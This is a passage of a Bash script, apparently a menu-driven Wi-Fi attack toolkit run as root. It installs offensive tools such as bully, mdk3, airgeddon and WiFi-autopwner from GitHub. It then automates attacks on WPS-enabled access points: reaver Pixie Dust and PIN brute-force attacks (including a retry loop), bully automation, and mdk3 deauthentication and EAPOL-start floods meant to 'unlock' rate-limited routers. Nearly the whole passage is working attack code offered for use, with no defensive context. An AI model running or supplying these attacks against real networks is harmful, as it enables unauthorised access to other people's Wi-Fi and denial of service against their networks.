https://github.com/aanarchyy/bully.git\n\tcd /root/bully/src\n\tmake\n\tsudo make install\t\n\tcd\t\n}\nfunction install_wifiautopwner\n{\n\tif [[ -d \"/root/WiFi-autopwner\" ]]\n\tthen\n\t\techo -e \"Removing old...\"\n\t\techo -e \"$PAKTC\"\n\t\t$READAK\n\t\trm -r /root/WiFi-autopwner\n\tfi\t\t\n\techo -e \"Installing WiFi-autopwner\"\n\techo -e \"Tool by Mi-Al\"\n\tcd\n\tgit clone https://github.com/Mi-Al/WiFi-autopwner.git\n}\nfunction install_vmr\n{\n\tif [[ -d /root/mdk3-v6 || -d /root/VMR ]]\n\tthen\n\t\techo -e \"Removing old...\"\n\t\techo -e \"$PAKTC\"\n\t\t$READAK\n\t\trm -r /root/mdk3-v6\n\t\tif [[ -f /root/VMR-MDK-K2-2017R-012x2.zip ]]\n\t\tthen\n\t\t\trm /root/VMR-MDK-K2-2017R-012x2.zip\n\t\tfi\n\t\tif [[ -d /root/VMR ]]\n\t\tthen\n\t\t\trm -r /root/VMR\n\t\tfi\n\tfi\n\tcd\n\twget https://github.com/musket33/VMR-MDK-Kali2-Kali2016/raw/master/VMR-MDK-K2-2017R-012x2.zip\n\tunzip /root/VMR-MDK-K2-2017R-012x2.zip -d /root/VMR\n\tcp -r /root/VMR/mdk3-v6 /root/\n\tcd /root/mdk3-v6\n\tmake\n\tmake install\n\tchmod 755 /root/mdk3-v6/*\n\tchmod +x /root/VMR/*.sh\n\tcd\n}\nfunction install_airgeddon\n{\n\tif [[ -d \"/root/airgeddon\" ]]\n\tthen\n\t\techo -e \"Removing old...\"\n\t\techo -e \"$PAKTC\"\n\t\t$READAK\n\t\trm -r /root/airgeddon\n\tfi\n\techo -e \"Installing...\"\n\tsleep 1\n\techo -e \"Installing Airgeddon\"\n\techo -e \"Tool by v1s1t0r1sh3r3\"\n\tcd\n\tgit clone https://github.com/v1s1t0r1sh3r3/airgeddon.git\n\tcd airgeddon\n\tchmod +x airgeddon.sh\n}\nfunction dash_calc\n{\n\t\n\tsize=${#TERMINALTITLE}\n\tcalc=$(( 65-size ))\n\tcalc=$(( calc/2 ))\n\tnumcalc=1\n\tDASHESN=\"-\"\n\twhile [ $numcalc != $calc ]\n\tdo\n\t\tDASHESN=\"\"$DASHESN\"-\"\n\t\tnumcalc=$(( numcalc+1 ))\n\tdone\n\techo -e \"$DASHESN\"$RS\"$TERMINALTITLE\"$CE\"$DASHESN\"\n}\nfunction scan_wash\n{\n\twhile true\n\tdo\n\tif [[ \"$SCW\" != 0 ]]\n\tthen\n\t\tclear\n\t\techo -e \"Scaning in new terminal...\"\n\t\techo -e \"\"$YS\"PRESS CTRL C IN WASH WHEN READY.\"$CE\"\"\n\t\tsleep 1\n\t\txterm -geometry 80x25+9999+9999 -T \"Press Ctrl C when ready\" -e \"wash  -i $WLANNM | tee /root/lscript/tempwash \"\n\tfi\n\t\tSCW=1\n\t\tclear\n\t\twash_awk\n\t\tif [[ \"$lines\" = 0 ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"No networks with WPS found nearby\"$CE\"\"\n\t\tfi\n\t\techo -e \"\"$YS\" r\"$CE\") Rescan\"\n\t\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\t\techo -e \"Choose: \"\n\t\tread WASHSCAN\n\t\tif [[ \"$WASHSCAN\" = \"r\" ]]\n\t\tthen\n\t\t\tcontinue\n\t\telif [[ \"$WASHSCAN\" = \"back\" || \"$WASHSCAN\" = \"b\" ]]\n\t\tthen\n\t\t\tSCW=0\n\t\t\tbreak\n\t\telif [[ \"$WASHSCAN\" -ge 1 ]]\n\t\tthen\n\t\t\tif [[ \"$WASHSCAN\" -gt \"$lines\" ]]\n\t\t\tthen\n\t\t\t\techo -e \"\"$RS\"Wrone choice...\"$CE\"\"\n\t\t\t\tSCW=0\n\t\t\t\tsleep 2\n\t\t\t\tcontinue\n\t\t\tfi\n\t\t\tWASHSCAN2=\"${SORTED[$WASHSCAN]}\"\n\t\t\tBSSIDT=\"${abssid[$WASHSCAN2]}\"\n\t\t\tCHANT=\"${achannel[$WASHSCAN2]}\"\n\t\t\tESSIDT=\"${aessid[$WASHSCAN2]}\"\n\t\t\texport BSSIDT\n\t\t\texport CHANT\n\t\t\texport ESSIDT\n\t\t\tif [[ ! \"${alock[WASHSCAN2]}\" = \"No\" ]]\n\t\t\tthen\n\t\t\t\tclear\n\t\t\t\techo -e \"\"$RS\"This AP is locked\"$CE\"\"\n\t\t\t\tsleep 1\n\t\t\t\tSCW=0\n\t\t\t\techo -e \"Do you want to try to unlock it?\"$YNYES\"\"\n\t\t\t\tread UNW\n\t\t\t\tif [[ ! \"$UNW\" = \"n\" ]]\n\t\t\t\tthen\n\t\t\t\t\tunlock_wps\n\t\t\t\tfi\n\t\t\t\tcontinue\n\t\t\tfi\n\t\t\twhile true\n\t\t\tdo\n\t\t\t\tclear\n\t\t\t\techo -e \"\"$RS\"----------You need strong connection------------\"$CE\"\"\n\t\t\t\techo -e \"\"$YS\" 1\"$CE\") Pixie dust                         fast\"\n\t\t\t\techo -e \"\"$YS\" 2\"$CE\") Pixie loop till pin found          fast\"\n\t\t\t\techo -e \"\"$YS\" 3\"$CE\") Bruteforse                         slow\"\n\t\t\t\techo -e \"\"$YS\" 4\"$CE\") Bully\"\n\t\t\t\techo -e \"\"$YS\" r\"$CE\") Rescan\"\n\t\t\t\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\t\t\t\techo -e \"Choose: \"\n\t\t\t\tread WPSL\n\t\t\t\tif [[ \"$WPSL\" = \"r\" ]]\n\t\t\t\tthen\n\t\t\t\t\tRESCAN=1\n\t\t\t\t\tSCW=1\n\t\t\t\t\tbreak\n\t\t\t\telif [[ \"$WPSL\" = \"back\" || \"$WPSL\" = \"b\" ]]\n\t\t\t\tthen\n\t\t\t\t\tRESCAN=1\n\t\t\t\t\tSCW=0\n\t\t\t\t\tbreak\n\t\t\t\telif [[ \"$WPSL\" = \"1\" ]]\n\t\t\t\tthen\n\t\t\t\t\tpixie_attack\n\t\t\t\telif [[ \"$WPSL\" = \"2\" ]]\n\t\t\t\tthen\n\t\t\t\t\tpixie_loop\n\t\t\t\telif [[ \"$WPSL\" = \"3\" ]]\n\t\t\t\tthen\n\t\t\t\t\treaver_attack\n\t\t\t\telif [[ \"$WPSL\" = \"4\" ]]\n\t\t\t\tthen\n\t\t\t\t\tbully_script\n\t\t\t\tfi\t\t\n\t\t\tdone\n\t\t\tif [[ \"$RESCAN\" = 1 ]]\n\t\t\tthen\n\t\t\t\tRESCAN=0\n\t\t\t\tcontinue\n\t\t\telse\n\t\t\t\tbreak\n\t\t\tfi\n\t\telse\n\t\t\tSCW=0\n\t\tfi\n\tdone\n}\nfunction unlock_wps\n{\nwhile true\ndo\n\tclear\n\tTERMINALTITLE=\"WPS UNLOCK\"\n\tdash_calc\n\tprintf '\\033]2;WPS UNLOCK\\a'\n\techo -e \"\"$BS\"2 or 3 network interfaces are recommended for this attack\"$CE\"\"\n\techo -e \"\"\n\tif [[ \"$INTS\" = \"\" ]]\n\tthen\n\t\tINTS=1\n\tfi\n\techo -e \"\"$YS\"set\"$CE\") Set your interface(s)                   Current:\"$INTS\"\"\n\techo -e \"\"$YS\" ch\"$CE\") Check if unlocked\"\n\t#~ echo -e \"\"$YS\"  t\"$CE\") Set attack's timeout                    Current:\"$TM\" secs\"\n\techo -e \"\"$BS\"Attacks:\"$CE\"\"\n\techo -e \"\"$YS\" 1\"$CE\") DOS flood\"\n\techo -e \"\"$YS\" 2\"$CE\") EAPOL start flood\"\n\t#~ echo -e \"\"$YS\" 3\"$CE\") Cause Michael failure (only TKIP / AES+TKIP)\"\n\t#~ echo -e \"\"$YS\" 4\"$CE\") \"\n\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\techo -e \"Choose:\"\n\tread UNL\n\tclear\n\tif [[ \"$UNL\" = \"b\" || \"$UNL\" = 00 || \"$UNL\" = 0 ]]\n\tthen\n\t\tbreak\n\telif [[ \"$UNL\" = \"ch\" || \"$UNL\" = \"c\" ]]\n\tthen\n\t\t#~ xterm -T \"Check if unlocked\" -e 'wash -i $WLANNM | grep \"$ESSIDT\" | awk \"{FS=\" \"} {print $5}\" | tee /root/wa.txt'\n\t\t#~ T1=$(wash -i $WLANNM | grep \"$ESSIDT\" | awk -F ' ' '{print $5}')\n\t\t#~ if [[ \"$T1\" == \"Yes\" ]]\n\t\t#~ then\n\t\t\t#~ echo -e \"\"$RS\"Still locked\"$CE\"\"\n\t\t#~ else\n\t\t\t#~ echo -e \"\"$YS\"Unlocked!!!\"$CE\"\"\n\t\t#~ fi\n\t\txterm -T \"Check if unlocked\" -e 'wash -i $WLANNM' & disown\n\telif [[ \"$UNL\" = \"1\" ]]\n\tthen\n\t\tn=0\n\t\twhile true\n\t\tdo\n\t\t\tif [[ \"$n\" = 0 ]]\n\t\t\tthen\n\t\t\t\txterm -T \"DOS flood on $WLANNM\" -hold -e 'mdk3 $WLANNM a -a $BSSIDT -m && echo -e \"\" && echo -e \"Close this window manually\"' & disown\n\t\t\t\tn=$((n+1))\n\t\t\t\tcontinue\n\t\t\telse\n\t\t\t\tif [[ \"$n\" != \"$INTS\" ]]\n\t\t\t\tthen\n\t\t\t\t\tCURIN=\"${NI[$n]}\"\n\t\t\t\t\tif [[ \"$CURIN\" = \"\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\techo -e \"\"$RS\"Error 15. Interface not found.\"$CE\"\"\n\t\t\t\t\t\tsleep 3\n\t\t\t\t\telse\n\t\t\t\t\t\txterm -T \"DOS flood on $CURIN\" -hold -e 'mdk3 $CURIN a -a $BSSIDT -m && echo -e \"\" && echo -e \"Close this window manually\"' & disown\n\t\t\t\t\tfi\n\t\t\t\telse\n\t\t\t\t\tbreak\n\t\t\t\tfi\n\t\t\tfi\n\t\t\tn=$((n+1))\n\t\tdone\n\telif [[ \"$UNL\" = \"2\" ]]\n\tthen\n\t\techo -e \"Packets to inject per second:(\"$YS\"Enter\"$CE\"=\"$DPPS\")\"\n\t\tread PPS\n\t\tif [[ \"$PPS\" = \"\" ]]\n\t\tthen\n\t\t\tPPS=\"$DPPS\"\n\t\tfi\n\t\tif [[ \"$PPS\" -le 0 ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"Wrong choice\"$CE\"\"\n\t\t\tsleep 2\n\t\t\tcontinue\n\t\tfi\n\t\texport PPS\n\t\tn=0\n\t\tOFSET=-20\n\t\twhile true\n\t\tdo\n\t\t\tOFSET=$((OFSET+20))\n\t\t\texport OFSET\n\t\t\tif [[ \"$n\" = 0 ]]\n\t\t\tthen\n\t\t\t\txterm -T \"EAPOL start flood on $WLANNM\" -geometry 80x11+0+\"$OFSET\" -hold -e 'mdk3 $WLANNM x 0 -t $BSSIDT -n \"$ESSIDT\" -s $PPS && echo -e \"\" && echo -e \"Close this window manually\"' & disown\n\t\t\t\tn=$((n+1))\n\t\t\t\tcontinue\n\t\t\telse\n\t\t\t\tif [[ \"$n\" != \"$INTS\" ]]\n\t\t\t\tthen\n\t\t\t\t\tCURIN=\"${NI[$n]}\"\n\t\t\t\t\texport CURIN\n\t\t\t\t\tif [[ \"$CURIN\" = \"\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\techo -e \"\"$RS\"Error 16. Interface not found.\"$CE\"\"\n\t\t\t\t\t\tsleep 3\n\t\t\t\t\telse\n\t\t\t\t\t\txterm -T \"EAPOL start flood on $CURIN\" -geometry 80x11+0+\"$OFSET\" -hold -e 'mdk3 $CURIN x 0 -t $BSSIDT -n \"$ESSIDT\" -s $PPS && echo -e \"\" && echo -e \"Close this window manually\"' & disown\n\t\t\t\t\tfi\n\t\t\t\telse\n\t\t\t\t\tbreak\n\t\t\t\tfi\n\t\t\tfi\n\t\t\tn=$((n+1))\n\t\tdone\n\telif [[ \"$UNL\" = \"set\" ]]\n\tthen\n\t\twhile true\n\t\tdo\n\t\t\tclear\n\t\t\techo -e \"\"$BS\"Current interface number\"$CE\": \"$INTS\"\"\n\t\t\techo -e \"\"$YS\" a\"$CE\") Add another interface\"\n\t\t\techo -e \"\"$YS\" r\"$CE\") Reset interfaces\"\n\t\t\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\t\t\tread NIN\n\t\t\tclear\n\t\t\tif [[ \"$NIN\" = \"b\" || \"$NIN\" = 00 ]]\n\t\t\tthen\n\t\t\t\tbreak\n\t\t\telif [[ \"$NIN\" = \"r\" ]]\n\t\t\tthen\n\t\t\t\twhile true\n\t\t\t\tdo\n\t\t\t\t\tnewints=$((INTS-1))\n\t\t\t\t\tif [[ \"$newints\" -lt 1 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\techo -e \"\"$RS\"No interfaces added to reset\"$CE\"\"\n\t\t\t\t\t\tsleep 2\n\t\t\t\t\t\tbreak\n\t\t\t\t\telse\n\t\t\t\t\t\tINTS=1\n\t\t\t\t\t\tbreak\n\t\t\t\t\tfi\n\t\t\t\tdone\n\t\t\telif [[ \"$NIN\" = \"a\" ]]\n\t\t\tthen\n\t\t\t\techo -e \"New interface: \"\n\t\t\t\tread NII\n\t\t\t\tTEST3=$(ifconfig | grep \"$NII\")\n\t\t\t\tif [[ \"$TEST3\" = \"\" ]]\n\t\t\t\tthen\n\t\t\t\t\techo -e \"\"$RS\"Could not find this interface on your system\"$CE\"\"\n\t\t\t\t\tsleep 3\n\t\t\t\telse\n\t\t\t\t\techo -e \"\"$BS\"Interface found!\"$CE\"\"\n\t\t\t\t\tsleep 2\n\t\t\t\t\tclear\n\t\t\t\t\tcheckmonitor=$(iwconfig \"$NII\" | grep \"Mode:Monitor\")\n\t\t\t\t\tif [[ \"$checkmonitor\" = \"\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\techo -e \"\"$BS\"Enabling monitor mode for \"$NII\"...\"\n\t\t\t\t\t\tairmon-ng start $NII | grep \"monitor mode\" | awk -F \"(\" {'print $2'} | cut -d ')' -f1 &> /dev/null && echo -e \"\"$YS\"Done\"$CE\"\"\n\t\t\t\t\t\tcheckmonitor=$(iwconfig \"$NII\"mon | grep \"Mode:Monitor\")\n\t\t\t\t\t\tif [[ \"$checkmonitor\" = \"\" ]]\n\t\t\t\t\t\tthen\n\t\t\t\t\t\t\techo -e \"\"$RS\"Couldn't start monitor mode\"$CE\"\"\n\t\t\t\t\t\t\tsleep 2\n\t\t\t\t\t\t\tcontinue\n\t\t\t\t\t\tfi\n\t\t\t\t\tfi\n\t\t\t\t\tz=1\n\t\t\t\t\tl=0\n\t\t\t\t\twhile [[ \"$z\" -le \"$INTS\" ]]\n\t\t\t\t\tdo\n\t\t\t\t\t\tif [[ \"$NII\" == \"${NI[$z]}\" || \"$NII\" == \"$WLANNM\" ]]\n\t\t\t\t\t\tthen\n\t\t\t\t\t\t\techo -e \"\"$RS\"Interface already set\"$CE\"\"\n\t\t\t\t\t\t\tsleep 2\n\t\t\t\t\t\t\tl=1\n\t\t\t\t\t\tfi\n\t\t\t\t\t\tz=$((z+1))\n\t\t\t\t\tdone\n\t\t\t\t\tif [[ \"$l\" = 1 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tcontinue\n\t\t\t\t\tfi\n\t\t\t\t\tNI[$INTS]=\"$NII\"\n\t\t\t\t\tINTS=$((INTS+1))\n\t\t\t\tfi\n\t\t\tfi\n\t\tdone\n\tfi\ndone\n}\nfunction reaver_attack\n{\n\tclear\n\tTERMINALTITLE=\"WPS BRUTEFORCE\"\n\tdash_calc\n\tprintf '\\033]2;WPS BRUTEFORCE\\a'\n\techo -e \"Delay between every attempt(\"$YS\"Enter\"$CE\"=60): \"\n\tread DELAY\n\tif [[ \"$DELAY\" = \"\" ]]\n\tthen\n\t\tDELAY=60\n\tfi\n\t#xterm -geometry 90x70+0+0 -e \"sleep 5 && aireplay-ng $WLANNM -1 120 -a $BSSIDT\" & disown\n\treaver -i $WLANNM -b $BSSIDT -c $CHANT -d $DELAY -L -f -N -vvv | tee /root/lscript/wpslog\n\techo -e \"Press \"$YS\"enter\"$CE\" to go back\"\n\tread\t\n}\nfunction pixie_loop\n{\n\tclear\n\tTERMINALTITLE=\"PIXIE LOOP ATTACK\"\n\tdash_calc\n\tprintf '\\033]2;PIXIE LOOP ATTACK\\a'\n\techo -e \"Delay between every attempt(\"$YS\"Enter\"$CE\"=15): \"\n\tread DELAY\n\tif [[ \"$DELAY\" = \"\" ]]\n\tthen\n\t\tDELAY=15\n\telif [[ ! \"$DELAY\" -ge 0 ]]\n\tthen\n\t\tDELAY=0\n\tfi\n\twhile true\n\tdo\n\t\ttrap 'break' SIGINT\n\t\techo \"\" > \"$LPATH\"/wpslogloop\n\t\treaver -i $WLANNM -b $BSSIDT -c $CHANT -N -K 1 -f -vvv <<< $'y\\n' | tee /root/lscript/wpslogloop\n\t\tif [[ -f \"$LPATH\"/wpslog ]]\n\t\tthen\n\t\t\tTTT=$(cat \"$LPATH\"/wpslogloop | grep \"WPS pin not found!\")\n\t\t\tTTTT=$(cat \"$LPATH\"/wpslogloop | grep \"WPS pin:    <empty>\")\n\t\t\tTTT2=$(cat \"$LPATH\"/wpslogloop | grep \"found\")\n\t\t\tTTT3=$(cat \"$LPATH\"/wpslogloop | grep \"WPA\")\n\t\t\tif [[ \"$TTT\" != \"\" || \"$TTTT\" != \"\" ]]\n\t\t\tthen\n\t\t\t\techo -e \"\"$RS\"Pin not found. Retrying...\"$CE\"\"\n\t\t\telif [[ \"$TTT2\" != \"\" || \"$TT3\" != \"\" ]]\n\t\t\tthen\n\t\t\t\techo -e \"\"$YS\"Pin found!!\"$CE\"\"\n\t\t\t\tcp \"$LPATH\"/wpslog >> \"$LPATH\"/wpslog\n\t\t\t\tsleep 2\n\t\t\t\tbreak\n\t\t\telse\n\t\t\t\techo -e \"\"$RS\"Pin not found. Retrying...\"$CE\"\"\n\t\t\tfi\n\t\t\tif [[ \"$DELAY\" -gt 1 ]]\n\t\t\tthen\n\t\t\t\techo -e \"Waiting \"$DELAY\" seconds...\"\n\t\t\telif [[ \"$DELAY\" = 1 ]]\n\t\t\tthen\n\t\t\t\techo -e \"Waiting \"$DELAY\" second...\"\n\t\t\tfi\n\t\t\tsleep $DELAY\n\t\telse\n\t\t\techo -e \"\"$RS\"Error 10. Could not locate wpslogloop file.\"$CE\"\"\n\t\t\tsleep 4\n\t\t\tbreak\n\t\tfi\n\tdone\n\ttrap - SIGINT\n\techo -e \"Press \"$YS\"enter\"$CE\" to go back\"\n\tread\n\t\n}\nfunction pixie_attack\n{\n\tclear\n\tTERMINALTITLE=\"PIXIE DUST ATTACK\"\n\tdash_calc\n\tprintf '\\033]2;PIXIE DUST ATTACK\\a'\n\t#xterm -geometry 90x70+0+0 -e \"aireplay-ng $WLANNM -1 10 -a $BSSIDT\" & disown\n\treaver -i $WLANNM -b $BSSIDT -c $CHANT -N -f --pixie-dust -vvv | tee /root/lscript/wpslog\n\techo -e \"Press \"$YS\"enter\"$CE\" to go back\"\n\tread\n}\nfunction reaver_wpastart\n{\n\treaver -i $WLANNM -b $BSSIDT -c $CHANT -N -p $WPST -L -f -g 1 -d 2 -vvv\n\techo -e \"$PAKTC\"\n\tread\n}\nfunction associate_aireplay\n{\n\techo -e \"Enter your target's BSSID: \"\n\tread -e BSSIDT\n\texport BSSIDT\n\texport -f aireplay_command\n\txterm -e bash -c 'aireplay_command; exec bash'\n\tclear\n\texec bash \"$0\"\n}\n#~ function wash_awk\n#~ {\n#~ file=\"/root/lscript/tempwash\"\n#~ linestotal=$(cat $file | awk 'END{print NR}')\n#~ lines=$((linestotal-7))\n#~ n=1\n#~ if [[ \"$lines\" != 0 ]]\n#~ then\n\t#~ echo -e \"    BSSID             CH ESSID\"\n#~ fi\n#~ while [ $n -le \"$lines\" ]\n#~ do\n\t#~ nnn=$((n+7))\n\t#~ nnum[$n]=$nnn\n\t#~ abssid[$nnn]=$(cat $file | awk -v nn=\"$nnn\" '{if(NR==nn)print $1}')\n\t#~ achannel[$nnn]=$(cat $file | awk -v nn=\"$nnn\" '{if(NR==nn)print $2}')\n\t#~ aessid[$nnn]=$(cat $file | awk -v nn=\"$nnn\" '{if(NR==nn)print $7}')\n\t#~ ti=7\n\t#~ while true\n\t#~ do\n\t\t#~ essidtest=$(cat $file | awk -v nn=\"$nnn\" -v po=\"$ti\" '{if(NR==nn)print $po}')\n\t\t#~ if [[ \"$essidtest\" != \"\" ]]\n\t\t#~ then\n\t\t\t#~ aessid[$nnn]=\"${aessid[$nnn]} $essidtest\"\n\t\t#~ else\n\t\t\t#~ break\n\t\t#~ fi\n\t\t#~ ti=$((ti+1))\n\t#~ done\n\t#~ alock[$nnn]=$(cat $file | awk -v nn=\"$nnn\" '{if(NR==nn)print $5}')\n\t#~ if [[ ! ${alock[$nnn]} = \"No\" ]]\n\t#~ then\n\t\t#~ locked=\"$RS\"\n\t#~ else\n\t\t#~ locked=\"$YS\"\n\t#~ fi\n\t#~ size=${#achannel[$nnn]}\n\t#~ if [[ \"$n\" -le 9 ]]\n\t#~ then\n\t\t#~ if [[ \"$size\" = 2 ]]\n\t\t#~ then\n\t\t\t#~ echo -e \" \"$locked\"\"$n\"\"$CE\") \"$locked\"${abssid[$nnn]} ${achannel[$nnn]} ${aessid[$nnn]}\"$CE\"\"\n\t\t#~ else\n\t\t\t#~ echo -e \" \"$locked\"\"$n\"\"$CE\") \"$locked\"${abssid[$nnn]} ${achannel[$nnn]}  ${aessid[$nnn]}\"$CE\"\"\n\t\t#~ fi\n\t#~ else\n\t\t#~ if [[ \"$size\" = 2 ]]\n\t\t#~ then\n\t\t\t#~ echo -e \"\"$locked\"\"$n\"\"$CE\") \"$locked\"${abssid[$nnn]} ${achannel[$nnn]} ${aessid[$nnn]}\"$CE\"\"\n\t\t#~ else\n\t\t\t#~ echo -e \"\"$locked\"\"$n\"\"$CE\") \"$locked\"${abssid[$nnn]} ${achannel[$nnn]}  ${aessid[$nnn]}\"$CE\"\"\n\t\t#~ fi\n\t#~ fi\n\t#~ n=$(( n+1 ))\n#~ done\n#~ }\n\nfunction wash_awk\n{\nfile=\"/root/lscript/tempwash\"\nlinestotal=$(cat $file | awk 'END{print NR}')\nlines=$((linestotal-2))\nn=1\nif [[ \"$lines\" != 0 ]]\nthen\n\techo -e \"    BSSID             CH PR ESSID\"\nfi\nwhile [[ \"$n\" -le \"$lines\" ]]\ndo\n\tnnn=$((n+2))\n\tnnum[$n]=$nnn\n\tabssid[$nnn]=$(cat $file | awk -v nn=\"$nnn\" '{if(NR==nn)print $1}')\n\tachannel[$nnn]=$(cat $file | awk -v nn=\"$nnn\" '{if(NR==nn)print $2}')\n\tapower[$nnn]=$(cat $file | awk -v nn=\"$nnn\" '{if(NR==nn)print $3}' | cut -d '-' -f2)\n\ttempn=${apower[$nnn]}\n\tapower[$nnn]=$((100-tempn))\n\tif [[ ${apower[$nnn]} -lt 10 ]]\n\tthen\n\t\tapower[$nnn]=\"${apower[$nnn]} \"\n\tfi\n\taessid[$nnn]=$(cat $file | awk -v nn=\"$nnn\" '{if(NR==nn)print $7 \" \" $8 \" \" $9 \" \" $10 \" \" $11 \" \" $12}')\n\tti=7\n\t#~ while true\n\t#~ do\n\t\t#~ essidtest=$(cat $file | awk -v nn=\"$nnn\" -v po=\"$ti\" '{if(NR==nn)print $po}')\n\t\t#~ echo \"Total = $essidtest\"\n\t\t#~ if [[ \"$essidtest\" != \"\" ]]\n\t\t#~ then\n\t\t\t#~ aessid[$nnn]=\"${aessid[$nnn]} $essidtest\"\n\t\t#~ else\n\t\t\t#~ break\n\t\t#~ fi\n\t\t#~ ti=$((ti+1))\n\t#~ done\n\talock[$nnn]=$(cat $file | awk -v nn=\"$nnn\" '{if(NR==nn)print $5}')\n\tn=$(( n+1 ))\ndone\n##sorting them according to the power:\nn=1\nwhile [[ \"$n\" -le \"$lines\" ]]\ndo\n\t#~ nnn=$((n+2))\n\t#~ size=${#achannel[$nnn]}\n\t#~ if [[ ! ${alock[$nnn]} = \"No\" ]]\n\t#~ then\n\t\t#~ locked=\"$RS\"\n\t#~ else\n\t\t#~ locked=\"$YS\"\n\t#~ fi\n\t#~ if [[ \"$n\" -le 9 ]]\n\t#~ then\n\t\t#~ if [[ \"$size\" = 2 ]]\n\t\t#~ then\n\t\t\t#~ echo -e \" \"$locked\"\"$n\"\"$CE\") \"$locked\"${abssid[$nnn]} ${achannel[$nnn]}  ${apower[$nnn]} ${aessid[$nnn]}\"$CE\"\"\n\t\t#~ else\n\t\t\t#~ echo -e \" \"$locked\"\"$n\"\"$CE\") \"$locked\"${abssid[$nnn]} ${achannel[$nnn]}  ${apower[$nnn]} ${aessid[$nnn]}\"$CE\"\"\n\t\t#~ fi\n\t#~ else\n\t\t#~ if [[ \"$size\" = 2 ]]\n\t\t#~ then\n\t\t\t#~ echo -e \"\"$locked\"\"$n\"\"$CE\") \"$locked\"${abssid[$nnn]} ${achannel[$nnn]}  ${apower[$nnn]} ${aessid[$nnn]}\"$CE\"\"\n\t\t#~ else\n\t\t\t#~ echo -e \"\"$locked\"\"$n\"\"$CE\") \"$locked\"${abssid[$nnn]} ${achannel[$nnn]}  ${apower[$nnn]} ${aessid[$nnn]}\"$CE\"\"\n\t\t#~ fi\n\t#~ fi\n\tn2=1\n\tVALUE=0\n\twhile [[ \"$n2\" -le \"$lines\" ]]\n\tdo\n\t\tif [[ \"${apower[${nnum[$n2]}]}\" -ge \"$VALUE\" ]]\n\t\tthen\n\t\t\tVALUE=${apower[${nnum[$n2]}]}\n\t\t\tNUM=${nnum[$n2]}\n\t\tfi\n\t\tn2=$((n2+1))\t\n\tdone\n\tSORTED[$n]=$NUM\n\tSORTEDPR[$n]=$VALUE\n\tapower[$NUM]=\"-1\"\n\tn=$((n+1))\ndone\nn=1\nwhile [[ \"$n\" -le \"$lines\" ]]\ndo\n\t#size=${#achannel[${nnum[$n]}]}\n\tif [[ ! ${alock[${nnum[$n]}]} = \"No\" ]]\n\tthen\n\t\tlocked=\"$RS\"\n\telse\n\t\tlocked=\"$YS\"\n\tfi\n\tif [[ \"$n\" -le 9 ]]\n\tthen\n\t\tif [[ ${achannel[${SORTED[$n]}]} -lt 10 ]]\n\t\tthen\n\t\t\techo -e \" \"$locked\"\"$n\"\"$CE\") \"$locked\"${abssid[${SORTED[$n]}]} ${achannel[${SORTED[$n]}]}  ${SORTEDPR[$n]} ${aessid[${SORTED[$n]}]}\"$CE\"\"\n\t\telse\n\t\t\techo -e \" \"$locked\"\"$n\"\"$CE\") \"$locked\"${abssid[${SORTED[$n]}]} ${achannel[${SORTED[$n]}]} ${SORTEDPR[$n]} ${aessid[${SORTED[$n]}]}\"$CE\"\"\n\t\tfi\n\telse\n\t\tif [[ ${achannel[${SORTED[$n]}]} -lt 10 ]]\n\t\tthen\n\t\t\techo -e \"\"$locked\"\"$n\"\"$CE\") \"$locked\"${abssid[${SORTED[$n]}]} ${achannel[${SORTED[$n]}]}  ${SORTEDPR[$n]} ${aessid[${SORTED[$n]}]}\"$CE\"\"\n\t\telse\n\t\t\techo -e \"\"$locked\"\"$n\"\"$CE\") \"$locked\"${abssid[${SORTED[$n]}]} ${achannel[${SORTED[$n]}]} ${SORTEDPR[$n]} ${aessid[${SORTED[$n]}]}\"$CE\"\"\n\t\tfi\n\tfi\n\tn=$((n+1))\ndone\n}\nfunction bully_script\n{\nTERMINALTITLE=\"BULLY AUTOMATION\"\ndash_calc\nprintf '\\033]2;BULLY AUTOMATION\\a'\nwhile true\ndo\n\tclear\n\tif [[ \"$BRUTE\" = \"\" ]]\n\tthen\n\t\tBRUTE=\"OFF\"\n\tfi\n\tif [[ \"$FORCE\" = \"\" ]]\n\tthen\n\t\tFORCE=\"OFF\"\n\tfi\n\tif [[ \"$PIXIE\" = \"\" ]]\n\tthen\n\t\tPIXIE=\"ON\"\n\tfi\n\tif [[ \"$SEQ\" = \"\" ]]\n\tthen\n\t\tSEQ=\"OFF\"\n\tfi\n\tif [[ \"$VERBOSITY\" = \"\" ]]\n\tthen\n\t\tVERBOSITY=3\n\tfi\n\tif [[ \"$IGNORELOCKOUT\" = \"\" ]]\n\tthen\n\t\tIGNORELOCKOUT=\"OFF\"\n\tfi\n\tif [[ \"$LOCKWAIT\" = \"\" ]]\n\tthen\n\t\tLOCKWAIT=60\n\tfi\n\tif [[ \"$WAITPERATTEMPT\" = \"\" ]]\n\tthen\n\t\tWAITPERATTEMPT=0\n\tfi\n\tif [[ \"$BSSIDT\" = \"\" || \"$ESSIDT\" = \"\" || \"$CHANT\" = \"\" ]]\n\tthen\n\t\tOK=0\n\telse\n\t\tOK=1\n\tfi\n\techo -e \"\"$YS\" 1\"$CE\") Essid                       CURRENT:\"$ESSIDT\"\"\n\techo -e \"\"$YS\" 2\"$CE\") Bssid                       CURRENT:\"$BSSIDT\"\"\n\techo -e \"\"$YS\" 3\"$CE\") Channel                     CURRENT:\"$CHANT\"\"\n\techo -e \"\"$YS\" 4\"$CE\") Bruteforce Checksum digit   CURRENT:\"$BRUTE\"\"\n\techo -e \"\"$YS\" 5\"$CE\") Pixie wps                   CURRENT:\"$PIXIE\"\"\n\techo -e \"\"$YS\" 6\"$CE\") Wait after lock             CURRENT:\"$LOCKWAIT\" secs\"\n\techo -e \"\"$YS\" 7\"$CE\") Wait per attempt            CURRENT:\"$WAITPERATTEMPT\" secs\"\n\techo -e \"\"$YS\" 8\"$CE\") Force                       CURRENT:\"$FORCE\"\"\n\techo -e \"\"$YS\" 9\"$CE\") Sequential                  CURRENT:\"$SEQ\"\"\n\techo -e \"\"$YS\"10\"$CE\") Verbosity                   CURRENT:\"$VERBOSITY\"\"\n\techo -e \"\"$YS\"11\"$CE\") 